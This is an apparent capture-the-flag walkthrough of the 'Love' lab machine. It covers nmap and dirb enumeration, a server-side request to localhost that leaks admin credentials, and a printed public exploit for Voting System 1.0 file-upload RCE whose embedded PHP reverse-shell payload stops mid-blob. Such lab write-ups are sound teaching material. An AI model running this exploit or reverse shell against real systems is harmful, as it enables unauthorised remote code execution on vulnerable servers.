![](img/logo.png)

# Love - Easy Windows
# Walkthrough by P0z0x

## Enumeration

To start, run an nmap scan:

```bash
sudo nmap -T4 -p- -A 10.10.10.239 -oN scans/nmap-allports
# Nmap 7.91 scan initiated Sat Aug 14 21:28:46 2021 as: nmap -T4 -p- -A -oN scans/nmap-allports -vv 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up, received echo-reply ttl 127 (0.011s latency).
Scanned at 2021-08-14 21:28:47 UTC for 218s
Not shown: 65516 closed ports
Reason: 65516 resets
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/organizationalUnitName=love.htb/localityName=norway
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/organizationalUnitName=love.htb/localityName=norway
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
| -----BEGIN CERTIFICATE-----
| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD
| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ
| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X
| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow
| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv
| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi
| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20
| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0
| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U
| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8
| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD
| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL
| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A
| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE
| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz
| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h
| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?       syn-ack ttl 127
| fingerprint-strings: 
|   Kerberos, NULL: 
|_    Host '10.10.14.200' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.200' is not allowed to connect to this MariaDB server
5000/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a 2ba6 8ef4 7568 f99d d6f4 aaa2 03b5
| SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
| -----BEGIN CERTIFICATE-----
| MIIFBTCCAu2gAwIBAgIQQD+VWjjYeaVAiweoWrOJXjANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDDARMT1ZFMB4XDTIxMDQxMTE0MzkxOVoXDTI0MDQxMDE0MzkxOVow
| DzENMAsGA1UEAwwETE9WRTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
| APC54+VMM+g9yynvO9x5UWpskpl8oxYcplv/zck10LeamyoRMCoOb6+lPhokbydf
| 1cj/td1WjOoCkE22w8KBXt+GkBtYp1AuaiQuUWZbSU1TfKLgGTB+jqcn6L8oFdpm
| MMl1rdgW/dDLF4WRSgPd1bwSl1JrgM2ETbQNbuE+pPkUAOwQp9W2/YcSCPAc+a03
| bntUxAyVe/U4xm9GJYTliUGZCc4KY74ZhiIoE9N+qW9wH+THyTcKYFo6acCYK3OT
| NFxj2NVB34YSOaGwoJDfHOdt6q8hQSBk2MLcIlFMYpzyk6guxO6CYucufqPUhux8
| j8foDhPOQr4eg8L2WZq0mF2k0Owt+FPaFCQpq8Cuk3wxkrkHAlwzmxMjZUhO59Z7
| p7cSQt5JtDrSIghP9nePFkz1ARaUE4ifUfWb7ZhX5ZI2sWD7y5ilgK/+EJRUs8Qr
| aiNJQhr2W+Lu8Q8C821LrhQ8srRbV3APlj0jysYzTcerksSmA4L2NYEjdYuIkHNh
| VH7IUwAfyQCKhT9Z4l9TMmu0w84jvFV/e4PYrXe7W3jNquKI8+FvgAtj7crDkX6x
| ouN13d3Z12FsPFZB8S9cFhEnMUT0VcPqx4on6oD1+iD3dkPYi907kHjvHQqc43yZ
| vRSJBNy12LsX9bDyeew1jWBLqhdh0fApp+5LSKyEanENAgMBAAGjXTBbMA4GA1Ud
| DwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAVBgNVHREEDjAMggRMT1ZF
| ggRMb3ZlMB0GA1UdDgQWBBQNJyWWYTVg7yDEB8RiCpGkBlLzcjANBgkqhkiG9w0B
| AQsFAAOCAgEAOtD1tPlQAsAozmZxFGc7PiMkJpZbpS31Hb32/aFwTxeN/7VEmTPM
| +FyIo+ZxgL+GD6SGWtpunCGs2Hms3lbSxnPNPbdcaG6whP12Ih/xGuQEbXVq6uY3
| fmCL/zIHthIjDPbgvtrC0xB/1kioMrDdGK1jp1F9q1cd+9P3cTPXgpekTzcFixGF
| BkQTM0ty8FjZnwTYwtAJ7RcxbzhIGi4YlJGIBOi98XvParnR2co2XhR+gBBPhppC
| 0zKscOXtQrOyWymrq1XSEdFhExznQREXkGsUX9Ogw8yTdREt9jdlijjtQGISBlwG
| 807Ru8m6HeO35dhUp3fS1ZOQ94Zlmls8Uw4F0slQ5v44rhhbOziy3fcb63zSvFJ1
| jzk5yEoxER7tMiWrxCniGSI7kIs0ACGEWHbsbjfQuGVvTe2S/yBmUbCSuZPS9r1X
| w3EPapovLDMmx8PBLMXDa75bBE+si/3xS4w8OIepTrk+oajAWPjHSFrt6QRRI9Mv
| L1UEoxV1K7amnTybXb66kpvucZz0pQYVuRypOYLlFuFMC2vj8M/64Hfb5OhFG+6p
| RtFRdYl9s/H+R+Y+fB4o9Tf5vMpYwOCrBfTEGvm4JLBRGXn6f0ODcGqwVYVWyPEo
| 4pv8jZSiNJsmm6gsQXR4fLIPGuNjwmxJmm51Itv0Lb+FQogRk/9I0AI=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-14T21:52:47+00:00; +20m23s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?   syn-ack ttl 127
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=8/14%Time=611835B1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.200'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.200'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/14%OT=80%CT=1%CU=37457%PV=Y%DS=2%DC=T%G=Y%TM=6118366
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS
OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h05m23s, deviation: 3h30m02s, median: 20m22s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29716/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46453/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44577/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21885/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-14T14:52:35-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-14T21:52:34
|_  start_date: N/A

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   11.96 ms 10.10.14.1
2   12.05 ms 10.10.10.239

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 14 21:32:25 2021 -- 1 IP address (1 host up) scanned in 218.81 seconds
```
Looking at the certificate on port 443, we see a domain name:
```ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/organizationalUnitName=love.htb/localityName=norway```

Add this subdomain and the love domain name to our ```/etc/hosts```

```
sudo vi /etc/hosts
...
10.10.10.239		love.htb staging.love.htb
...
```
Running a quick dirbister scan on ```love.htb``` we find an admin page

```dirb http://love.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 14 21:46:51 2021
URL_BASE: http://love.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://love.htb/ ----
==> DIRECTORY: http://love.htb/admin/                                                                                                                                                                                                        
==> DIRECTORY: http://love.htb/Admin/                                                                                                                                                                                                        
==> DIRECTORY: http://love.htb/ADMIN/                                                                                                                                                                                                        
+ http://love.htb/aux (CODE:403|SIZE:298)                                                                                                                                                                                                    
+ http://love.htb/cgi-bin/ (CODE:403|SIZE:298)                                                                                                                                                                                               
+ http://love.htb/com1 (CODE:403|SIZE:298)                                                                                                                                                                                                   
+ http://love.htb/com2 (CODE:403|SIZE:298)                                                                                                                                                                                                   
+ http://love.htb/com3 (CODE:403|SIZE:298)                                                                                                                                                                                                   
+ http://love.htb/con (CODE:403|SIZE:298)                                                                                                                                                                                                    
==> DIRECTORY: http://love.htb/dist/                                                                                                                                                                                                         
+ http://love.htb/examples (CODE:503|SIZE:398)                                                                                                                                                                                               
==> DIRECTORY: http://love.htb/images/                                                                                                                                                                                                       
==> DIRECTORY: http://love.htb/Images/                                                                                                                                                                                                       
==> DIRECTORY: http://love.htb/includes/                                                                                                                                                                                                     
+ http://love.htb/index.php (CODE:200|SIZE:4388)                                                                                                                                                                                             
+ http://love.htb/licenses (CODE:403|SIZE:417)                                                                                                                                                                                               
+ http://love.htb/lpt1 (CODE:403|SIZE:298)                                                                                                                                                                                                   
+ http://love.htb/lpt2 (CODE:403|SIZE:298)                                                                                                                                                                                                   
+ http://love.htb/nul (CODE:403|SIZE:298)                                                                                                                                                                                                    
+ http://love.htb/phpmyadmin (CODE:403|SIZE:298)                                                                                                                                                                                             
==> DIRECTORY: http://love.htb/plugins/                                                                                                                                                                                                      
+ http://love.htb/prn (CODE:403|SIZE:298)                                                                                                                                                                                                    
+ http://love.htb/server-info (CODE:403|SIZE:417)                                                                                                                                                                                            
+ http://love.htb/server-status (CODE:403|SIZE:417)                                                                                                                                                                                          
+ http://love.htb/webalizer (CODE:403|SIZE:298)                                                                                                                                                                                              
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/admin/ ----
+ http://love.htb/admin/aux (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/admin/com1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/admin/com2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/admin/com3 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/admin/con (CODE:403|SIZE:298)                                                                                                                                                                                              
==> DIRECTORY: http://love.htb/admin/includes/                                                                                                                                                                                               
+ http://love.htb/admin/index.php (CODE:200|SIZE:6198)                                                                                                                                                                                       
+ http://love.htb/admin/lpt1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/admin/lpt2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/admin/nul (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/admin/prn (CODE:403|SIZE:298)                                                                                                                                                                                              
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/Admin/ ----
+ http://love.htb/Admin/aux (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/Admin/com1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/Admin/com2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/Admin/com3 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/Admin/con (CODE:403|SIZE:298)                                                                                                                                                                                              
==> DIRECTORY: http://love.htb/Admin/includes/                                                                                                                                                                                               
+ http://love.htb/Admin/index.php (CODE:200|SIZE:6198)                                                                                                                                                                                       
+ http://love.htb/Admin/lpt1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/Admin/lpt2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/Admin/nul (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/Admin/prn (CODE:403|SIZE:298)                                                                                                                                                                                              
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/ADMIN/ ----
+ http://love.htb/ADMIN/aux (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/ADMIN/com1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/ADMIN/com2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/ADMIN/com3 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/ADMIN/con (CODE:403|SIZE:298)                                                                                                                                                                                              
==> DIRECTORY: http://love.htb/ADMIN/includes/                                                                                                                                                                                               
+ http://love.htb/ADMIN/index.php (CODE:200|SIZE:6198)                                                                                                                                                                                       
+ http://love.htb/ADMIN/lpt1 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/ADMIN/lpt2 (CODE:403|SIZE:298)                                                                                                                                                                                             
+ http://love.htb/ADMIN/nul (CODE:403|SIZE:298)                                                                                                                                                                                              
+ http://love.htb/ADMIN/prn (CODE:403|SIZE:298)                                                                                                                                                                                              
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/dist/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/Admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
---- Entering directory: http://love.htb/ADMIN/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Aug 14 21:51:10 2021
DOWNLOADED: 18448 - FOUND: 47
```

## Web Investigation
nmap gave us three ports with apache server listening on. These were 80, 443 and 5000

Checking out these sites

HTTP gives us a login screen

![](img/http.png)

HTTPS gives a forbidden message

![](img/https.png)

As does port 5000

Looking at the subdirectory ```staging.love.htb```

Gives us a file scanner page which is not yet live

![](img/staging.png)

There is a demo site which accepts a file url

![](img/staging-demo.png)

As we couldn't access port 5000 from out attacking machine, let's try and access it as locahost from this page

![](img/staging-port-5000.png)

![](img/staging-admin-creds.png)

BINGO!! We have some credentials. Let's try them on the admin page we found through dirbuster

![](img/admin-login.png)

![](img/admin-dashboard.png)

We have logged onto the admin dashboard. Time to see what we can do

## Gaining a foothold
OK, so we have an admin login into the voting system but what can we do with this?

Looking on searchsploit there is an exploit for authenticated RCE. We have the admin user credentials so this may be what we need.

![](img/searchsploit.png)

Let's copy this exploit and take a look

```python
# Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
# Date: 19/01/2021
# Exploit Author: Richard Jones
# Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html
# Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Windows 10 2004 + XAMPP 7.4.4

import requests

# --- Edit your settings here ----
IP = "192.168.1.207" # Website's URL
USERNAME = "potter" #Auth username
PASSWORD = "password" # Auth Password
REV_IP = "192.168.1.207" # Reverse shell IP
REV_PORT = "8888" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"

payload = """
  
<?php

header('Content-type: text/plain');
$ip   = "IIPP";
$port = "PPOORRTT";
$payload = "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